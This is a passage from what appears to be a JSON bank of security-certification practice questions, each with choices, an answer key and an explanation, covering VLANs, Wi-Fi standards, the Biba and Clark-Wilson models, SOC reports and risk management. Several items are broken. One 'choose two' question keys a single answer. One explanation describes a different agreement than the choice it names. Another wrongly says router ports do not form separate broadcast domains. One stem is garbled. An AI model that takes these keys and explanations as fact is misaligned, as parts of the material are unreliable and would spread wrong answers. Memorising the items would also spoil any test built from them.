      "stem": "An enterprise plans to create separate network segments as per department names through the Virtual Local Area Network (VLAN). The enterprise expects some benefits as a result of the new configuration. Which option is NOT a correct statement about the VLAN configuration in the enterprise?",
      "choices": [
        "The VLAN is a collision domain created by switches",
        "The network will be more secure",
        "The configuration increases performance",
        "The configuration results in better network management"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 1 is correct. A VLAN is a broadcast domain created by switches rather than a collision domain. Option 2 is true because VLANs create separate segments that no one except the members of the same broadcast domain can access, thus making it more secure. Option 3 is true as the VLAN configuration will enable the organization to assign users that require high-performance networking without affecting the rest of the users in other VLANs. Option 4 is true because VLAN mainly fosters better network management. The question is asking for an incorrect statement; options 2, 3, and 4 are all true statements and thus are not the correct options."
    },
    {
      "id": "d4-q82",
      "domain": "4. Communication and Network Security",
      "stem": "A business is planning to establish a Wi-Fi network in the corporate headquarters besides the existing wired network infrastructure. However, the Chief Information Security Officer (CISO) is worried about the security of the wireless network and wants to deploy a control. Which option would be the MOST secure option for the enterprise?",
      "choices": [
        "Wired Equivalent Privacy (WEP)",
        "Wi-Fi Protected Access 2 (WPA2)",
        "Wi-Fi Protected Access 3 (WPA3)",
        "Wi-Fi Protected Access (WPA)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. WPA3 is the most secure option for the wireless network because it is a replacement for WPA2 and uses 192-bit encryption. Option 1 is not correct because WEP is an insecure standard and is no longer in use to protect Wi-Fi communications. WPA2 was replaced by WPA3 and is not the most secure, thus making option 2 incorrect. Option 4 is not correct because even though WPA was designed as a replacement for WEP, it is less secure than WPA2 and WPA3."
    },
    {
      "id": "d4-q83",
      "domain": "4. Communication and Network Security",
      "stem": "A business has been hosting sensitive data, mission-critical applications, and services in its data center for a long time. The newly hired Chief Information Security Officer (CISO) wants to make sure that all the protocols, technologies, and encryption standards used in the data center are secure and are the latest versions. Which option would pose a security risk to the enterprise if it were still found deployed in the data center?",
      "choices": [
        "Transport Layer Security Protocol Version 1.3 (TLS 1.3)",
        "Secure Sockets Layer Version 3.0 (SSL 3.0)",
        "Secure Shell Protocol Version 2 (SSH2)",
        "Internet Protocol Security (IPSec)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 2 is correct. SSL 3.0 is no longer secure and is deprecated, and would pose the greatest risk to the organization. Option 1 is not correct because TLS 1.3 is still a secure protocol and is the replacement for SSL. Option 3 is not correct as SSH2 is still a secure protocol of remote connectivity. Option 4 is not correct as IPSec is still the de facto security standard of network infrastructures."
    },
    {
      "id": "d4-q84",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to implement a mechanism to automatically configure all the IP addresses, subnet masks, default gateways, and domain name server information. Which option PRIMARILY provides the requirements outlined in the scenario?",
      "choices": [
        "Reverse Address Resolution Protocol (RARP)",
        "Address Resolution Protocol (ARP)",
        "Dynamic Host Configuration Protocol (DHCP)",
        "Domain Name System (DNS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. DCHP assigns IP addresses and related information to every host connected to the organization automatically. Option 1 is not correct because RARP is used to request IP addresses with a given MAC address and does not assign IP addresses to entities. Option 2 is not correct as ARP is used to find hardware or MAC addresses from known IP addresses/logical addresses and it does not assign IP addresses to endpoints. Option 4 is not correct as DNS is used to map IP addresses to hostnames and vice versa."
    },
    {
      "id": "d4-q85",
      "domain": "4. Communication and Network Security",
      "stem": "An enterprise wants to manage the collision domains and broadcast domains of each device to improve its network efficiency. Which option statements is NOT correct about collision and broadcast domains?",
      "choices": [
        "VLANs create a broadcast domain",
        "Ports on a switch, bridge, and router are in separate broadcast domains",
        "All ports on a switch, bridge, or router are in a separate collision domain",
        "All ports on a hub and repeater share the same collision domain"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 2 is correct. All ports on a switch, bridge, and router are in separate collision domains but are not in separate broadcast domains, thus option 2 is the incorrect statement. Option 1 is true because VLANs create a separate broadcast domain to avoid network congestion. Option 3 is true as all ports on a switch, bridge, or router are in a separate collision domain. All ports on a hub and repeater share the same collision domain, thus making option 4 true. As the question is asking for an incorrect statement, options 1, 3, and 4 are all true statements and thus are not the correct options."
    },
    {
      "id": "d8-q62",
      "domain": "8. Software Development Security",
      "stem": "An enterprise recently acquired a software product from a small software business. The enterprise wants to manage possible failures of the business to provide adequate support for the product in the future. In addition, the enterprise wants to have an agreement with the software business to handle issues with bankruptcy. Which option would PRIMARILY help the enterprise to protect itself from the issues outlined in the scenario?",
      "choices": [
        "Service-Level Agreement (SLA)",
        "Nondisclosure Agreement (NDA)",
        "Software escrow agreement",
        "Cryptographic key escrow"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 3 is correct. The protection mechanism that the organization implements against the software firm will be a software escrow agreement. A third party will hold the source code and related resources of the acquired software product. Option 1 is incorrect. An SLA is an agreement between the software firm and the organization, and it outlines the minimum performance requirements. Option 2 is not correct as an NDA is an employment agreement that restricts an employee or contractor from disclosing sensitive information they obtain throughout their employment. Option 4 is incorrect. Cryptographic key escrow is a secure key management practice that involves an agreement of keeping copies of keys with a trusted third party in a secure environment."
    },
    {
      "id": "d3-q82",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An officer has \"Top Secret\" clearance, and another officer has \"Secret\" clearance, in an enterprise. Both officers are assigned to the same case and are required to produce a common report about the case. The officer with \"Top Secret\" clearance can write and update the information in a document that the officer with \"Secret\" clearance works with. However, the officer with \"Secret\" clearance is unable to write or add updates to a document that the officer with the \"Top Secret\" clearance is working with. Which rule of the Biba model would BEST fit the situation outlined in the scenario?",
      "choices": [
        "Simple Integrity Property",
        "Simple Security Property",
        "Star Security Property",
        "Star Integrity Property"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 4 is correct. The Star Integrity Property of the Biba model prohibits a subject at a given security level from writing to or modifying an object at a higher integrity level (no write-up). Thus, the officer with \"Secret\" clearance cannot write in a document that the officer with \"Top Secret\" clearance is preparing. Option 1 is incorrect. The Simple Integrity Property of the Biba Model prevents a subject from reading an object labeled with a lower integrity level (no read-down). Options 2 and 3 are incorrect because the Simple Security Property and the Star Security Property of the Bell-LaPadula model protect the confidentiality of the information, not its integrity."
    },
    {
      "id": "d3-q83",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A financial enterprise plans to establish an approach to enforce data integrity and prevent fraudulent transactions. To achieve its objectives, the enterprise aims to allow the modification of transactions only through restricted intermediary interface models. Moreover, the enterprise wants to introduce well-formed transactions and Separation of Duties (SoD) principles to enforce data integrity. What security model would be the BEST to meet the requirements outlined in the scenario?",
      "choices": [
        "Clark-Wilson model",
        "Biba Integrity Model",
        "Bell-LaPadula model",
        "Brewer-Nash model"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 1 is correct. The Clark-Wilson model uses security labels to grant access to objects only through controlled interfaces or programs as it employs access control triplets, well-formed transactions, and SoD to strictly enforce data integrity. Option 3 is not correct as the Bell-LaPadula model is used to protect confidentiality but not data integrity. Option 2 is incorrect. The Biba Model is a state machine and multilevel security model that focuses on protecting data integrity. However, unlike the Clark-Wilson model, the Biba Model does not use access control triplets, well-formed transactions, and Separation of Duties (SoD) principles. Option 4 is incorrect. The Brewer-Nash model is a security model that prevents Conflict of Interest (COI) emanating from insider knowledge by subjects and does not provide data integrity."
    },
    {
      "id": "d8-q63",
      "domain": "8. Software Development Security",
      "stem": "The CISO of an enterprise is planning software testing to validate security controls before distributing internally and releasing new software products onto the market. The CISO is trying to determine the appropriate phase to conduct the testing process in the Software Development Lifecycle (SDLC). Which SDLC phase is BEST suited to start preparing the test plan for the testing?",
      "choices": [
        "Design phase",
        "Requirement analysis phase",
        "Implementation phase",
        "Development phase"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "option 1 is correct. Security checkpoints are defined, and a test plan is prepared during the design phase of the SDLC. Option 2 is incorrect. In the requirement analysis phase, security checkpoints are not yet defined, and it is too late to prepare test plans and conduct the testing. Option 3 is incorrect. The implementation phase is too late since the software has already been developed and is ready to be deployed in a production environment. Option 4 is not correct as the development phase is too late to consider preparing test plans and conducting testing processes. This is because the code of the software product is already written and tested in a test environment, or sometimes in production testing."
    },
    {
      "id": "d6-q82",
      "domain": "6. Security Assessment and Testing",
      "stem": "An e-commerce start-up business growing at a fast pace has caught the attention of government authorities. The business got a letter stating that their auditors will visit them to perform a security assessment. Which option is the PRIMARY reason for conducting the security assessment?",
      "choices": [
        "To verify whether the organization is compliant with General Data Protection Regulation (GDPR) laws",
        "To verify whether the organization has appropriate policies and procedures",
        "To verify whether the organization has appropriate and functional security controls",
        "To verify whether the organization is performing annual audits"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because the main reason for conducting a security assessment is to verify whether the company has appropriate security controls and whether these controls are working effectively. It helps identify potential risks and mitigate them in a timely manner to protect customer data. Option 1 is not correct because GDPR laws only apply to companies within the European Union and European Economic Area or companies sharing data with countries in the European Union and European Economic Area. This is not specified in the question. Option 2 is not correct because a security assessment is a comprehensive review of security since it assesses both administrative and technical controls. Option 4 is not correct because a security assessment’s main objective is not to verify whether the company is performing annual audits."
    },
    {
      "id": "d6-q83",
      "domain": "6. Security Assessment and Testing",
      "stem": "An auditor is evaluating the compliance and effectiveness of measures that reduce the security risk to business-critical applications. What best describes the auditor’s action?",
      "choices": [
        "Vulnerability assessment",
        "Security Control Assessment (SCA)",
        "Risk assessment",
        "Software code review"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because an SCA means the testing or evaluation of security controls to determine the compliance and effectiveness of the controls implemented and whether they are producing the desired outcome and meeting the organization’s objective. Option 1 is not correct because a vulnerability assessment is a process to identify new vulnerabilities, assign severity scores based on the number of systems affected, and prioritize patching. It does not involve an evaluation of the effectiveness of security controls. Option 3 is not correct because a risk assessment is a process of identifying, evaluating, and mitigating current and future risks to the organization. It does not involve an evaluation of the effectiveness of security controls. Option 4 is not correct because, in a software code review, auditors go through the source code to find vulnerabilities. White-box testing is a prime example of a software code review."
    },
    {
      "id": "d6-q84",
      "domain": "6. Security Assessment and Testing",
      "stem": "A penetration tester is testing an online banking website, involving entering random data into the bank account number field to crash the program or make it behave unexpectedly. Which option tests is the penetration tester NOT performing?",
      "choices": [
        "Fuzz testing",
        "Misuse case testing",
        "Synthetic transaction testing",
        "Random testing"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because, in synthetic transaction testing, automated scripts are run against a website to determine response times, or the scripts may execute complex transactions to verify some functionality. If a script is configured properly to cover all test scenarios, it can detect issues before a real user encounters them. Option 1 is not correct because fuzz testing is an automated process where random unexpected data is entered into the application to make it behave unexpectedly. The pen-tester in the scenario is doing exactly the same thing. Option 2 is not correct because in misuse case testing, the tester tries to manipulate the application to get it to return unexpected output. In the scenario, the test is aimed at making an online banking application behave unexpectedly; hence this answer is incorrect. Option 4 is not correct because it is similar to black-box software testing where applications and systems are tested by generating random, independent inputs."
    },
    {
      "id": "d6-q85",
      "domain": "6. Security Assessment and Testing",
      "stem": "A truck transport business is looking to build new Customer Relationship Management (CRM) software, and due to a lack of in-house expertise, they outsourced this project to a third-party business. As per the transport business’s security policy, the third-party business should not create any backdoors in the software to provide support. What is the BEST way to identify backdoors in software?",
      "choices": [
        "Fuzz testing",
        "Unit Testing",
        "Static testing",
        "Dynamic testing"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because, in static testing, the source code is reviewed to help identify software misconfigurations and backdoors. Such tests are performed outside of the software’s running environment. Option 1 is not correct because fuzz testing is an automated process where random data is input into the application to make it behave unexpectedly or to make the application crash. ption 2 is incorrect because, in black-box testing, the application is tested within its running environment to evaluate its behavior; it cannot identify maintenance hooks. The tester does not have access to the source code. Option 4 is not correct because it is similar to black-box testing, where applications are tested in their runtime environment without having access to the source code."
    },
    {
      "id": "d6-q86",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise's IT system was breached, and after investigation, it was found that the attacker used an Active Directory (AD) account of a terminated domain administrator that was kept active for two months. Which option would have EFFECTIVELY DETECTED this user account?",
      "choices": [
        "Account management practices",
        "User and Entity Behavior Analysis (UEBA) technology",
        "User account audit and reporting",
        "Human Resource (HR) departing checklist"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because account management practices would have detected this issue while doing monthly reporting. In account management, user accounts are reviewed along with their permissions. It can be performed on all user accounts but since it is time-consuming, only privileged account permissions are reviewed. Option 2 is not correct because UEBA detects changes in user behavior. Although this technology would have detected the administrator’s activity after two months, it is not an ideal solution since the attacker was already using it. Better account management practice would have detected this earlier, and the organization could have prevented the attack. Option 3 is not correct because user account audit and reporting are part of account management practice. Option 4 is not correct because the HR departing checklist may or may not include the AD account disablement practice. HR might have its own process for a terminated employee, including processing their last pay stub, etc."
    },
    {
      "id": "d6-q87",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise is planning to move its disaster recovery data center to a different location and is currently in the site survey phase. Its Maximum Tolerable Downtime (MTD) is three weeks, and it wants a cost-effective solution with minimal setup required. Which option sites would MEET the enterprise’s requirements?",
      "choices": [
        "Mobile site",
        "Hot site",
        "Cold site",
        "Warm site"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because a cold site is the cheapest solution with minimal setup involved. The organization’s MTD is three weeks, and they can easily move stuff and activate the Disaster Recovery (DR) location in that time frame. Option 1 is not correct because a mobile site is a non-traditional alternative to a cold or warm site. All the environment controls are already installed in self-contained containers. Since the organization wants a minimal setup as part of the solution, this option is incorrect. Option 2 is not correct because a hot site, the most expensive option of all, is a replica of the production site. Data is synced within minutes and, in case of disaster, it can be activated within seconds. Option 4 is not correct because a warm site is a more expensive option than a cold site but is cheaper than a hot site. It has hardware and internet connections already set up and, in case of a disaster, it can be activated within days."
    },
    {
      "id": "d6-q88",
      "domain": "6. Security Assessment and Testing",
      "stem": "A public trading business is undergoing a merger with another business. To lower the risk to its shareholders, the stock exchange wants to evaluate the business’s security and privacy controls. To do so, they visit the business’s website. Which option SOC reports details their security and privacy evaluation?",
      "choices": [
        "SOC 2 Type 2",
        "SOC 2 Type 1",
        "SOC 1",
        "SOC 3"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct because SOC 3 reports are available to the public and are generally published on company websites. These reports are designed to provide assurance to the general public about security and privacy controls. Option 1 is not correct because SOC 2 Type 2 results are confidential and are only shared with the organization under a signed NDA. These reports showcase the effectiveness of security controls over a period of time. Option 2 is not correct because SOC 2 Type 1 results are also confidential. They contain the auditor’s opinion about the security control description provided by the company’s management. These results showcase the effectiveness of security controls over a particular time period. Option 3 is not correct because SOC 1 reports provide insight into an organization’s finances and are only shared with others under a signed NDA."
    },
    {
      "id": "d6-q89",
      "domain": "6. Security Assessment and Testing",
      "stem": "An airline business is looking to upgrade its software system to screen new movies for its customers. The business maintains a high level of security standards and wants to ensure the new software system will not reduce its security posture and will adhere to its organizational policies. Which option will provide the BEST level of assurance to the business?",
      "choices": [
        "Service-Level Agreement (SLA)",
        "Software accreditation",
        "External audit",
        "Risk assessment"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because external audits provide the best level of assurance. The best assurance is provided by independent auditors that audit the organization as per the organization’s security policies. Option 1 is not correct because an SLA outlines the level of service the partner organization is required to provide. These terms are agreed upon during contract negotiations. SLAs do not provide the best level of assurance regarding the security of a system or application. Option 2 is not correct because accreditation means that the senior management accepts the level of security and functional requirement provided by the software. It does not provide the best level of assurance for security when compared to an external audit. Option 4 is not correct because a risk assessment is performed to evaluate current and future risks, safeguards, countermeasures, and security controls based on cost-benefit analysis. It does not provide any assurance about the security of a software system."
    },
    {
      "id": "d6-q90",
      "domain": "6. Security Assessment and Testing",
      "stem": "You are writing a program using the Java language to calculate the percentage of users accessing Facebook during work hours in your enterprise. However, the process is gracefully aborted when executed because, instead of \"divide by 100,\" you configured \"divide by 00\" in your code. Which option should be configured to provide a BETTER end-user experience and AVOID displaying a detailed error message?",
      "choices": [
        "Ethical disclosure",
        "Exception handling",
        "Change management",
        "Risk response"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because exception handling is a process where developers anticipate errors and develop mechanisms to avoid the termination of the software. Also, if the exception is not handled appropriately, the end user might see a detailed error message that may disclose too much information. Option 1 is not correct because ethical disclosure is the principle of notifying vendors about a vulnerability found in their product and giving them enough time to fix the issue. Option 3 is not correct because change management is a process to reduce the impact on the organization when a change is made and to avoid unnecessary changes to prevent any downtime. Option 4 is not correct because risk response is performed during risk assessment. Risk response involves the selection of new controls based on a cost-benefit analysis."
    },
    {
      "id": "d6-q91",
      "domain": "6. Security Assessment and Testing",
      "stem": "A cyber security professional has discovered a zero-day vulnerability in the patch management system used by their enterprise. The vulnerability provides administrative privileges to local users. According to the ethical disclosure principle, which among the following is the BEST step to take?",
      "choices": [
        "Disclose the vulnerability to the vendor privately.",
        "Disclose the vulnerability to the public to create awareness.",
        "Develop a fix and share it with the security community.",
        "Create a post about the vulnerability on LinkedIn."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct because as per the ethical disclosure principle, the security professional should disclose the vulnerability to the vendor privately and provide the vendor enough time to patch the vulnerability before going public. Option 2 is not correct because, while disclosing the vulnerability to the public to create awareness might sound like a good idea, it would give attackers the chance to exploit the vulnerability until a patch is released. Option 3 is not correct because developing a fix can be time-consuming and the security community might not trust the fix since it has not come from the vendor. Instead, security professionals can apply compensating controls until the vendor remediates the issue. Option 4 is not correct because creating a post about the issue on LinkedIn is similar to disclosing it to the public."
    },
    {
      "id": "d1-q108",
      "domain": "1. Security and Risk Management",
      "stem": "ABC Limited has been using STRIDE as its threat modeling methodology to identify possible threats to the enterprise. The business is concerned about the damage that personnel with administrative access to assets may cause to the business. Furthermore, it has established strong access controls, security auditing, dual controls, and various security controls to minimize threats and prevent users from gaining unauthorized access to sensitive organizational data. What security threats of STRIDE is the business PRIMARILY trying to address?",
      "choices": [
        "Elevation of privilege",
        "Denial of Service (DoS)",
        "Information Disclosure",
        "Spoofing"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The company is trying to handle security threats that may occur because of privilege elevation or escalation. STRIDE is a mnemonic that stands for Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service (DoS), and Elevation of privilege. It helps organizations model security threats from different perspectives. The Information Disclosure element of STRIDE focuses on preventing security threats that may occur due to unauthorized disclosure of sensitive data. DoS attacks mainly affect the accessibility of services, and STRIDE helps to handle availability-related security threats. Spoofing is an attack that depends on a falsified identity to gain unauthorized access, and STRIDE helps to model identity-related threats"
    },
    {
      "id": "d1-q109",
      "domain": "1. Security and Risk Management",
      "stem": "The senior leadership of a business directs the information security manager to develop and present a security awareness program that aligns with the strategy of the business. The information security manager creates a tailored and scoped program and presents it for senior management’s input and approval. Management approves the program and instructs the manager to prioritize and start implementing it with the most vulnerable teams. What will be the PRIMARY objective of the security awareness program in the enterprise?",
      "choices": [
        "Increase the technical proficiency of employees",
        "Change employee behavior",
        "Reduce phishing attacks",
        "Improve the detection of security events and incidents"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The main objective of security awareness programs in an organization is to bring behavioral change. Option 1 is not correct because increasing the technical proficiency of employees is the core objective of the formal training program in the organization and not the objective of security awareness. Option 3 is incorrect. Reducing phishing attacks in the organization will be attributed to the change of behavior brought about in the organization but it is not the main objective. Option 4 is incorrect. Improvement in the detection of security events and incidents will be the result of behavioral changes in employees."
    },
    {
      "id": "d8-q64",
      "domain": "8. Software Development Security",
      "stem": "In a recent internal assessment, what option processes ensures that there is consistency between the accounting records and production environment and that unauthorized alterations to the configuration have not been made?",
      "choices": [
        "Configuration audit",
        "Configuration control",
        "Configuration identification",
        "Request control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Periodic configuration auditing is carried out to ensure that there is a match between the accounting records and production environment and that there are no unauthorized changes to the configuration. Option 2 is less suitable because the configuration control process makes sure that any changes made to the software version adhere to the control and configuration management policies. Option 3 is less suitable because configuration identification is a process whereby software product configuration in the entire organization is documented by administrators. Option 4 is less suitable because request control refers to a process that lays down a framework through which consumers can make modification requests, developers can give priority to various tasks, or managers can carry out a cost/benefit analysis."
    },
    {
      "id": "d1-q110",
      "domain": "1. Security and Risk Management",
      "stem": "In a recent internal assessment, as a cybersecurity professional, you observe that the enterprise's VPN allows you to copy and paste the contents from the enterprise's environment to your personal laptop. As an enthusiast, you download all of the client's Internal Design and Architecture documents for future reference and upload them to your personal cloud storage. What option professional ethics policies have you violated?",
      "choices": [
        "ISC2 code of ethics",
        "Acceptable Use Policy (AUP)",
        "Non-Disclosure Agreement (NDA)",
        "Service Level Agreement (SLA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. An organization's Acceptable Use Policy (AUP) defines what governs an employee's use of the organization's assets. It covers a wide range of issues surrounding the employee's rights and responsibilities as well as sanctions for cases of non-adherence. The ISC2 code of ethics (1) applies to individuals who have signed the ISC2 NDA which includes the code of ethics, generally, all the CISSPs need to adhere to the ISC2 code of ethics NDA or a confidentiality agreement (3) is a contract through which the parties agree not to disclose any information covered by the agreement. In the above case, you have not shared the Organization's Private information with anyone. SLA (4) is a formal agreement between the service provider and the client which defines the specific responsibilities of the service provider and sets the customer expectations. It includes the Performance and Reporting expectations, which do not fit the above scenario."
    },
    {
      "id": "d1-q111",
      "domain": "1. Security and Risk Management",
      "stem": "After a control-gap review, you have recently been hired as a network engineer in a multinational business. You've already studied the business's mission, vision, goals, corporate strategy, and organization and security needs, and you want to develop the business's information security strategy. What option should you do first?",
      "choices": [
        "Develop the company's information security program policy.",
        "Consider constraints and resources.",
        "Do a risk assessment.",
        "Determine the milestones and blueprint."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. As a CISO, your first assignment should be to conduct a risk assessment (gap analysis) which will help you address the gaps in the company's security program. Options 1, 2, and 4 are incorrect because developing the company's information security program policy, consideration of constraints and resources, and determination of milestones and blueprint can only be done after identifying the potential risks."
    },
    {
      "id": "d1-q112",
      "domain": "1. Security and Risk Management",
      "stem": "During a quarterly audit, an employee is drafting a document that will provide detailed information on how a security system in the organization will be implemented. Which document is being prepared?",
      "choices": [
        "Guideline",
        "Policy",
        "Procedure",
        "Baseline"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. A procedure (also known as a security procedure) gives a detailed highlight of how a security system will be implemented within an organization. A procedure is developed for each task that an organization performs in accordance with the standards, guidelines, and baselines. A guideline shows how baselines and security standards can be enforced. A policy highlights what needs protection and to what extent it should be protected. A baseline refers to the minimum security standard that should be enforced on an infrastructure."
    },
    {
      "id": "d1-q113",
      "domain": "1. Security and Risk Management",
      "stem": "What option is not one of the important roles that a senior manager can play on an organization continuity planning team?",
      "choices": [
        "Acting as an arbitrator when disputes occur among members.",
        "Setting priorities for the team.",
        "Obtaining resources for the team.",
        "Training staff."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Senior managers play several critical roles during the business continuity planning process. For instance, they ensure the planning team has all the resources that they need, set priorities, and act as arbitrators in the event of any disputes among team members. Therefore, options 1, 2, and 3 are all roles played by a senior manager, option 4 is not. Training staff is the work of the human resource department."
    },
    {
      "id": "d1-q114",
      "domain": "1. Security and Risk Management",
      "stem": "What option agreements remains binding to an employee even after they have left the enterprise?",
      "choices": [
        "Job agreement",
        "Acceptable Usage Policy (AUP)",
        "Non-Disclosure Agreement (NDA)",
        "Privacy Policy Agreement"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. A Non-Disclosure Agreement is meant to guard any confidential information of an organization. As an information security officer, being party to this agreement means that you will not in any way share confidential information of the organization even after the end of your contract, be it through retirement, termination, or resignation. Option 2 is less suitable since a Non-Compete Agreement stops an employee from serving another organization that is considered a competitor. Option 1 is less suitable because a job agreement or employment contract states the terms of employment of the employee. Option 4 is less suitable because a Privacy Policy Agreement basically tells users the kind of information they are required to provide."
    },
    {
      "id": "d1-q115",
      "domain": "1. Security and Risk Management",
      "stem": "During a quarterly audit, an employee is investigating a security incident where it was discovered that an attacker created a fake user account to take advantage of the system vulnerability and grant administrative rights to that account. In reference to the STRIDE model, these types of attacks can be referred to as __________ and _________. (Choose TWO of the following answer options.)?",
      "choices": [
        "Tampering",
        "Information disclosure",
        "Elevation of privileges",
        "Spoofing"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. First, the hacker gained access to the system using false credentials. This is called spoofing (4). The fake credentials could be a fake username, e-mail, password, SSID, IP address, etc. When the spoofed credentials are fed into the system, it assumes that they are legitimate and grants access. Secondly, the hacker upgraded the limited user account and provided it with administrator powers. This is called elevation of privileges (3). Option 1 is less suitable because tampering attacks attempt to interfere with the integrity of resources or data. Option 2 is less suitable because information disclosure refers to a situation where a system accidentally reveals classified data to the users."
    },
    {
      "id": "d1-q116",
      "domain": "1. Security and Risk Management",
      "stem": "During a quarterly audit, a global payment processor continuity plan, but they are not sure which resources to prioritize due to the challenge of putting together information about intangible and tangible assets. Which risk assessment approach would you advise them to apply?",
      "choices": [
        "Qualitative risk assessment",
        "Quantitative risk assessment",
        "Both qualitative and quantitative risk assessments",
        "Neither qualitative nor quantitative risk assessment"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. They would experience the best outcome by applying a combination of both qualitative and quantitative risk assessment elements. Qualitative risk assessment does a good job of handling intangible risks, while quantitative risk assessment works excellently in analyzing financial (or other tangible) risks. Option 1 and option 2 are incorrect since both quantitative and qualitative risk assessments have their own limitations related to the resource and information requirements for analytical or data models. Therefore, they should combine the two to make their opportunity and risk more predictable. option 4 is less suitable since they must apply at least one or both of these risk assessment approaches."
    },
    {
      "id": "d1-q117",
      "domain": "1. Security and Risk Management",
      "stem": "What option enterprises is most likely to be impacted by the provisions of FISMA?",
      "choices": [
        "Hospitals",
        "School districts",
        "Defense contractors",
        "Financial institutions"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The Federal Information Security Management Act (FISMA) applies to federal government contractors as well as agencies. The law which came into existence in 2002 requires federal contractors and agencies to devise a program that guarantees information security and protection, and documents and executes it. Among the mentioned entities, the one that is likely to operate subject to FISMA is the defense contractor. Option 1 is less suitable because hospitals are affected by the Health Insurance Portability and Accountability Act (HIPAA). Option 2 is less suitable because school districts are likely to be impacted by the Family Education Rights and Privacy Act (FERPA). Option 4 is less suitable because financial institutions, such as banks, are required to comply with the Gramm-Leach-Billey Act (GLBA)."
    },
    {
      "id": "d1-q118",
      "domain": "1. Security and Risk Management",
      "stem": "During a security governance meeting, a bank has come up with a security program that will equip its employees with skills related to their specific duties at work. This kind of security program is called____________?",
      "choices": [
        "Education",
        "Training",
        "Due care",
        "Awareness"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. A security training program is meant to equip employees with skills and knowledge that are specific to their roles at work. This is often designed for people who share similar job specifications. Option 1 is less suitable because education is giving people further teachings, beyond that which they need for everyday work. Option 3 is less suitable because due care refers to measures taken by a company to make sure that its employees and assets are protected and secured and that the top management has sufficiently assessed and assumed all transferred or unmitigated risks. Education, training, and awareness form part of a company's due care. Option 4, Awareness, refers to the act of helping the employees to familiarize themselves with security and understanding their role as stipulated in the policy as well as any activities they are not supposed to engage in."
    },
    {
      "id": "d2-q65",
      "domain": "2. Asset Security",
      "stem": "In a recent internal assessment, a research university has been assigned the responsibility of labeling several important files by embedding data on them. This type of label is referred to as_____________________?",
      "choices": [
        "Steganography",
        "Digital watermark",
        "Data Loss Prevention (DLP)",
        "Copyright notice"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. A digital watermark refers to a type of marker that is embedded in media such as images, videos, or audio to label it or help identify the file owner. Option 1 is less suitable because steganography refers to the science applied to hiding information, usually in files or images. Option 3 is less suitable because (DLP) Data Loss Prevention is a remedy that was developed to ensure data is not lost. Option 4 is less suitable because a copyright notice offers information concerning the copyright asserted on a file."
    },
    {
      "id": "d2-q66",
      "domain": "2. Asset Security",
      "stem": "An employee of an international financial institution would like to gain access to some critical customer information in order to serve a client as illustrated in the diagram below. What option data roles will grant them access to the data they want?",
      "choices": [
        "Administrators",
        "Users",
        "Data processors",
        "Data sharing"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
